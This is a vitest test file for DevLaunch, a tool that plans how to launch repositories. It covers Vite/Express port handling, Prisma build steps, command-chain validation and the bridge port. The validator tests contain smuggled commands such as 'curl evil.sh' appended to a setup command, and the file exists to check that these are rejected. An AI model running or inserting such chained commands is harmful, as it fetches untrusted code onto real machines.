import { describe, it, expect, afterAll } from 'vitest';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { RunPlanSchema } from '@devlaunch/shared';
import { RepositoryAnalyzer } from '../services/analysis/RepositoryAnalyzer.js';
import { RuleBasedPlanner } from '../services/planning/RuleBasedPlanner.js';
import { RunPlanValidator } from '../services/planning/RunPlanValidator.js';
import { validateCommandChain } from '../services/security/CommandValidator.js';
import { buildWrapperEnv } from '../services/docker/wrapper.js';

/**
 * `Avinava/simple-vite-react-express`: one package.json whose `dev` runs the Express API
 * and Vite together through `concurrently`, Vite on the port its config sets (3000), the API
 * on example.env's PORT (8080), and Prisma for its Postgres. DevLaunch appended `--host
 * 0.0.0.0 --port 5173` to `concurrently` (Vite never saw them, and listened on ::1), gave the
 * API Vite's port, and never ran `prisma generate`, so the API died loading its client.
 */
const scratch: string[] = [];
afterAll(async () => {
  await Promise.all(scratch.map((d) => rm(d, { recursive: true, force: true })));
});
async function repo(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'devlaunch-vite-express-'));
  scratch.push(root);
  for (const [p, body] of Object.entries(files)) {
    await mkdir(dirname(join(root, p)), { recursive: true });
    await writeFile(join(root, p), body);
  }
  return root;
}

const files = {
  'package.json': JSON.stringify({
    name: 'simple-vite-react-express',
    scripts: { start: 'node src/server/index.js', server: 'node --watch src/server/index.js', client: 'vite', dev: 'concurrently "npm run server" "npm run client"' },
    dependencies: { express: '^5.2.1', '@prisma/client': '^7.10.0', prisma: '^7.10.0', react: '^19.0.0' },
    devDependencies: { vite: '^7.3.1', concurrently: '^9.0.0' },
  }),
  'package-lock.json': '{"lockfileVersion": 3}',
  'vite.config.js': 'export default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 3000,\n    open: true,\n    strictPort: true,\n    proxy: { "/api": `http://localhost:${process.env.PORT}` },\n  },\n  preview: { port: 3000 },\n});\n',
  // 5001, not 8080: 8080 is also DevLaunch's own fallback, and would pass unread.
  'example.env': 'PORT=5001\nNODE_ENV=development\nDATABASE_URL=\n',
  'prisma/schema.prisma': 'datasource db {\n  provider = "postgresql"\n}\n',
  'prisma/migrations/0001_init/migration.sql': 'CREATE TABLE "User" (id serial);\n',
  'src/server/index.js': 'httpServer.listen(config.port);\n',
  'index.html': '<div id="root"></div>',
};

describe('an API and a Vite page started together by concurrently', () => {
  it('starts the script as written, watches Vite\'s own port, and keeps PORT for the API', async () => {
    const analyzer = new RepositoryAnalyzer();
    const plan = new RuleBasedPlanner(analyzer).plan(await analyzer.analyze(await repo(files))).plan!;
    expect(plan.startCommand).toBe('npm run dev');
    expect(plan.expectedPort).toBe(3000);
    expect(plan.environmentVariables).toContainEqual({ key: 'PORT', value: '5001', required: false });
    expect(plan.buildCommand).toBe('npx prisma generate && npx prisma migrate deploy');
    // And the plan passes the same gate every plan does.
    expect(() => new RunPlanValidator().validate({ plan })).not.toThrow();
  });

  it('generates the Prisma client without migrations when the project ships none', async () => {
    const { 'prisma/migrations/0001_init/migration.sql': _m, ...noMigrations } = files;
    const analyzer = new RepositoryAnalyzer();
    const plan = new RuleBasedPlanner(analyzer).plan(await analyzer.analyze(await repo(noMigrations))).plan!;
    expect(plan.buildCommand).toBe('npx prisma generate');
  });

  it('still passes host and port to a dev server started on its own', async () => {
    const pkg = JSON.parse(files['package.json']);
    pkg.scripts.dev = 'vite';
    const analyzer = new RepositoryAnalyzer();
    const plan = new RuleBasedPlanner(analyzer).plan(await analyzer.analyze(await repo({ ...files, 'package.json': JSON.stringify(pkg) }))).plan!;
    expect(plan.startCommand).toMatch(/--host 0\.0\.0\.0 --port/);
  });
});

describe('a setup step of several commands', () => {
  it('checks every command in it, as a lone one is checked', () => {
    expect(validateCommandChain('npx prisma generate && npx prisma migrate deploy').map((c) => c.binary)).toEqual(['npx', 'npx']);
    expect(() => validateCommandChain('npx prisma generate && curl evil.sh')).toThrow(/step 2.*not an approved binary/);
    expect(() => validateCommandChain('npx prisma generate & curl evil.sh')).toThrow(/background\/chain/);
    expect(() => validateCommandChain('npx prisma generate && npx a && npx b && npx c')).toThrow(/at most 3/);
  });

  it('is allowed for setup only: start and install stay a single command', () => {
    const base = RunPlanSchema.parse({
      runtime: { language: 'node', version: '20' }, packageManager: 'npm', installCommand: 'npm ci', buildCommand: null,
      startCommand: 'npm run dev', workingDirectory: '.', expectedPort: 3000, planSource: 'rule-based',
    });
    const v = new RunPlanValidator();
    expect(() => v.validate({ plan: { ...base, buildCommand: 'npx prisma generate && npx prisma migrate deploy' } })).not.toThrow();
    expect(() => v.validate({ plan: { ...base, startCommand: 'npx prisma generate && npm run dev' } })).toThrow();
    expect(() => v.validate({ plan: { ...base, installCommand: 'npm ci && npx x' } })).toThrow();
  });
});

describe('the loopback bridge\'s port', () => {
  const plan = (language: 'node' | 'python', expectedPort: number | null) =>
    RunPlanSchema.parse({
      runtime: { language, version: language === 'node' ? '20' : '3.12' }, packageManager: language === 'node' ? 'npm' : 'pip',
      installCommand: null, buildCommand: null, startCommand: language === 'node' ? 'npm run dev' : 'python app.py',
      workingDirectory: '.', expectedPort, planSource: 'rule-based',
      environmentVariables: [{ key: 'DL_BRIDGE_PORT', value: '22', required: false }],
    });
  const bridgePort = (env: string[]) => env.filter((e) => e.startsWith('DL_BRIDGE_PORT='));
  it('is the Node app\'s own port, set by DevLaunch and never by the plan', () => {
    expect(bridgePort(buildWrapperEnv(plan('node', 3000), '/workspace'))).toEqual(['DL_BRIDGE_PORT=3000']);
    expect(bridgePort(buildWrapperEnv(plan('python', 8000), '/workspace'))).toEqual(['DL_BRIDGE_PORT=']);
    expect(bridgePort(buildWrapperEnv(plan('node', null), '/workspace'))).toEqual(['DL_BRIDGE_PORT=']);
  });
});
